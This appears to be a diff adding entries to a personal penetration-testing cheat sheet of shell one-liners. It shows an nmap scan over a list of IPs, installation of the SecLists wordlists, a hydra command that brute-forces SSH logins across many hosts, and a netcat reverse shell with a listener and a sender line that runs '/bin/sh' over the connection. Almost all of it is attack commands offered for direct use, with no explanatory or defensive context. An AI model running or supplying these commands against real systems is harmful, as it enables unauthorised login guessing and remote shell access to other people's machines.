@@ -1,6 +1,19 @@
+//
+//basic nmap scan
+nmap -A -F -sC -oN </output/file> -iL </list/of/ips> --reason > ./scanA
+//
 //download meissler's wordlists
 apt-get install seclists
 updatedb
 locate */seclists/*
+//
 //running hydra with parsed wordlists
 hydra -L </path/2/logins/list> -P </path/2/passwords/list> -M </path/2/ips/list> -t 4 ssh
+//
+//reverse shell out
+//listener on receiver
+nc -lvp <port>
+//connector on sender
+nc <lhost> <port> -e /bin/sh
+//
+//
